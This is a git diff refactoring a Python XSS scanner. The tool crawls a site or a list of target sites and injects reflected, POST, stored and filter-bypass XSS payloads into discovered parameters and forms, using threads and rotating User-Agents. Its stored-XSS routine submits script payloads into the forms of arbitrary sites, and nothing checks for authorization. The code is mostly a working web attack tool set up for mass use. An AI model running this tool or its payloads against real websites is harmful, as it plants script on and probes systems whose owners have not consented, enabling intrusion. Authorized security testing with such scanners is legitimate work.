@@ -1,7 +1,7 @@
 import requests
 import threading
 import random
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 from bs4 import BeautifulSoup
 from colorama import Fore, Style, init
 import re
@@ -11,7 +11,6 @@ import base64
 # Initialize colorama
 init(autoreset=True)
 
-# User-Agents
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -35,10 +34,8 @@ for payload in xss_payloads:
     encoded_payloads.append(''.join(['%{:02x}'.format(b) for b in payload.encode()]))
     encoded_payloads.append(base64.b64encode(payload.encode()).decode())
 
-common_params = ['q', 'query', 'search', 's', 'id', 'page', 'param']
-
 def print_banner():
-    print(Fore.RED + '''
+    print(Fore.RED + r'''
    _____  ____   ____   
   / ____||  _ \ / __ \  
  | (___  | |_) | |  | | 
@@ -51,95 +48,44 @@ def log_result(message):
     with open("xss_scan_results.txt", "a") as f:
         f.write(message + "\n")
 
-def detect_reflected_xss(url):
-    for payload in xss_payloads + encoded_payloads:
-        try:
-            r = requests.get(url, params={"q": payload}, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
-            if payload in r.text:
-                result = f"[+] Reflected XSS Detected: {url} with payload: {payload}"
-                print(Fore.GREEN + result)
-                log_result(result)
-        except:
-            pass
-
-def detect_post_xss(url):
+def extract_parameters(url):
+    params = set()
     try:
         r = requests.get(url, timeout=10)
         soup = BeautifulSoup(r.text, 'html.parser')
-        forms = soup.find_all('form')
-        for form in forms:
-            action = form.get('action') or url
-            method = form.get('method', 'get').lower()
-            inputs = form.find_all('input')
-            for payload in xss_payloads + encoded_payloads:
-                data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
-                target_url = urljoin(url, action)
-                try:
-                    if method == 'post':
-                        res = requests.post(target_url, data=data, timeout=10)
-                    else:
-                        res = requests.get(target_url, params=data, timeout=10)
-                    if payload in res.text:
-                        result = f"[+] POST XSS Detected in form: {target_url} with payload: {payload}"
-                        print(Fore.CYAN + result)
-                        log_result(result)
-                except:
-                    continue
+
+        for form in soup.find_all('form'):
+            for inp in form.find_all('input'):
+                name = inp.get('name')
+                if name:
+                    params.add(name)
+
+        query_params = parse_qs(urlparse(url).query)
+        for param in query_params:
+            params.add(param)
+
     except:
         pass
+    return list(params)
 
-def detect_dom_xss(url):
-    try:
-        r = requests.get(url, timeout=10)
-        if re.search(r'document\\.location|location\\.hash|document\\.URL|document\\.referrer', r.text):
-            result = f"[!] Potential DOM XSS detected: {url}"
-            print(Fore.MAGENTA + result)
-            log_result(result)
-    except:
-        pass
+def detect_reflected_xss(url):
+    found = False
+    params = extract_parameters(url)
+    for payload in xss_payloads + encoded_payloads:
+        for param in params:
+            try:
+                r = requests.get(url, params={param: payload}, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
+                if payload in r.text:
+                    print(Fore.GREEN + f"[+] Reflected XSS Detected: {url} ? {param} = {payload}")
+                    log_result(f"[+] Reflected XSS Detected: {url} ? {param} = {payload}")
+                    found = True
+            except:
+                continue
+    if not found:
+        print(Fore.RED + f"[-] No Reflected XSS Found on: {url}")
 
-def detect_waf(url):
-    try:
-        r = requests.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
-        wafs = ["cloudflare", "sucuri", "akamai", "imperva"]
-        for waf in wafs:
-            if waf in r.text.lower():
-                result = f"[!] WAF Detected ({waf}): {url}"
-                print(Fore.YELLOW + result)
-                log_result(result)
-    except:
-        pass
-
-def parameter_discovery(url):
-    for param in common_params:
-        test_url = f"{url}?{param}=<script>alert(1)</script>"
-        try:
-            r = requests.get(test_url, timeout=10)
-            if "<script>alert(1)</script>" in r.text:
-                result = f"[+] Parameter {param} reflected at {url}"
-                print(Fore.LIGHTBLUE_EX + result)
-                log_result(result)
-        except:
-            continue
-
-def xss_filter_bypass_check(url):
-    tricks = [
-        "<sCript>alert(1)</sCript>",
-        "<scr<script>ipt>alert(1)</script>",
-        "<script/src=data:,alert(1)>"
-    ]
-    for trick in tricks:
-        try:
-            r = requests.get(url, params={"q": trick}, timeout=10)
-            if trick in r.text:
-                result = f"[+] Filter Bypass XSS Detected at {url} with payload: {trick}"
-                print(Fore.LIGHTGREEN_EX + result)
-                log_result(result)
-        except:
-            pass
-
-def stored_xss_check(url):
-    print(Fore.YELLOW + f"[*] Crawling {url} for stored XSS checks...")
+def detect_post_xss(url):
+    found = False
     try:
         r = requests.get(url, timeout=10)
         soup = BeautifulSoup(r.text, 'html.parser')
@@ -152,46 +98,137 @@ def stored_xss_check(url):
                 data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
                 target_url = urljoin(url, action)
                 try:
-                    if method == 'post':
-                        requests.post(target_url, data=data, timeout=10)
-                    else:
-                        requests.get(target_url, params=data, timeout=10)
+                    res = requests.post(target_url, data=data, timeout=10) if method == 'post' else requests.get(target_url, params=data, timeout=10)
+                    if payload in res.text:
+                        print(Fore.GREEN + f"[+] POST XSS Detected in form: {target_url} with payload: {payload}")
+                        log_result(f"[+] POST XSS Detected in form: {target_url} with payload: {payload}")
+                        found = True
                 except:
                     continue
-        # Check if payload appears again
+    except:
+        pass
+    if not found:
+        print(Fore.RED + f"[-] No POST XSS Found on: {url}")
+
+def detect_dom_xss(url):
+    try:
+        r = requests.get(url, timeout=10)
+        if re.search(r'document\.location|location\.hash|document\.URL|document\.referrer', r.text):
+            print(Fore.GREEN + f"[!] Potential DOM XSS Detected: {url}")
+            log_result(f"[!] Potential DOM XSS Detected: {url}")
+        else:
+            print(Fore.RED + f"[-] No DOM XSS Found on: {url}")
+    except:
+        pass
+
+def detect_waf(url):
+    try:
+        r = requests.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
+        wafs = ["cloudflare", "sucuri", "akamai", "imperva"]
+        for waf in wafs:
+            if waf in r.text.lower():
+                print(Fore.YELLOW + f"[!] WAF Detected ({waf}): {url}")
+                log_result(f"[!] WAF Detected ({waf}): {url}")
+    except:
+        pass
+
+def xss_filter_bypass_check(url):
+    tricks = [
+        "<sCript>alert(1)</sCript>",
+        "<scr<script>ipt>alert(1)</script>",
+        "<script/src=data:,alert(1)>"
+    ]
+    found = False
+    for trick in tricks:
+        try:
+            r = requests.get(url, params={"q": trick}, timeout=10)
+            if trick in r.text:
+                print(Fore.GREEN + f"[+] Filter Bypass XSS Detected at {url} with payload: {trick}")
+                log_result(f"[+] Filter Bypass XSS Detected at {url} with payload: {trick}")
+                found = True
+        except:
+            pass
+    if not found:
+        print(Fore.RED + f"[-] No Filter Bypass XSS Found on: {url}")
+
+def stored_xss_check(url):
+    print(Fore.YELLOW + f"[*] Checking Stored XSS on: {url}")
+    found = False
+    try:
+        r = requests.get(url, timeout=10)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        forms = soup.find_all('form')
+        for form in forms:
+            action = form.get('action') or url
+            method = form.get('method', 'get').lower()
+            inputs = form.find_all('input')
+            for payload in xss_payloads:
+                data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
+                target_url = urljoin(url, action)
+                try:
+                    requests.post(target_url, data=data, timeout=10) if method == 'post' else requests.get(target_url, params=data, timeout=10)
+                except:
+                    continue
         res = requests.get(url, timeout=10)
         for payload in xss_payloads:
             if payload in res.text:
-                result = f"[+] Stored XSS Detected at {url} with payload: {payload}"
-                print(Fore.LIGHTMAGENTA_EX + result)
-                log_result(result)
+                print(Fore.GREEN + f"[+] Stored XSS Detected at {url} with payload: {payload}")
+                log_result(f"[+] Stored XSS Detected at {url} with payload: {payload}")
+                found = True
     except:
         pass
+    if not found:
+        print(Fore.RED + f"[-] No Stored XSS Found on: {url}")
 
 def detect_csp(url):
     try:
         r = requests.get(url, timeout=10)
         csp = r.headers.get("Content-Security-Policy")
         if csp:
-            result = f"[!] CSP Detected on {url}: {csp}"
-            print(Fore.LIGHTRED_EX + result)
-            log_result(result)
+            print(Fore.LIGHTRED_EX + f"[!] CSP Detected on {url}: {csp}")
+            log_result(f"[!] CSP Detected on {url}: {csp}")
     except:
         pass
 
+def crawl_site(url):
+    visited = set()
+    to_visit = [url]
+    all_urls = []
+
+    while to_visit:
+        current = to_visit.pop()
+        if current in visited or not current.startswith(url):
+            continue
+        visited.add(current)
+        all_urls.append(current)
+        try:
+            r = requests.get(current, timeout=10)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            for link in soup.find_all('a', href=True):
+                full_url = urljoin(current, link['href'])
+                to_visit.append(full_url)
+        except:
+            continue
+    return all_urls
+
+def scan_target(url):
+    detect_waf(url)
+    detect_csp(url)
+    detect_reflected_xss(url)
+    detect_post_xss(url)
+    detect_dom_xss(url)
+    stored_xss_check(url)
+    xss_filter_bypass_check(url)
+
 def scan_single_target():
     url = input("Enter target URL: ").strip()
+    if not url.startswith("http"):
+        print(Fore.RED + "[!] Invalid URL format.")
+        return
     print(Fore.YELLOW + "[*] Crawling and scanning...")
     targets = [url] + crawl_site(url)
     for target in targets:
-        detect_waf(target)
-        detect_csp(target)
-        parameter_discovery(target)
-        detect_reflected_xss(target)
-        detect_post_xss(target)
-        detect_dom_xss(target)
-        stored_xss_check(target)
-        xss_filter_bypass_check(target)
+        scan_target(target)
 
 def scan_mass_targets():
     path = input("Enter path to targets list: ")
@@ -203,9 +240,8 @@ def scan_mass_targets():
         print("[!] File not found.")
         return
 
-    count = input("Enter number of threads: ")
     try:
-        count = int(count)
+        count = int(input("Enter number of threads: "))
     except:
         print("[!] Invalid thread count.")
         return
@@ -213,14 +249,7 @@ def scan_mass_targets():
     def worker(target):
         targets = [target] + crawl_site(target)
         for url in targets:
-            detect_waf(url)
-            detect_csp(url)
-            parameter_discovery(url)
-            detect_reflected_xss(url)
-            detect_post_xss(url)
-            detect_dom_xss(url)
-            stored_xss_check(url)
-            xss_filter_bypass_check(url)
+            scan_target(url)
 
     for target in raw_targets:
         t = threading.Thread(target=worker, args=(target,))
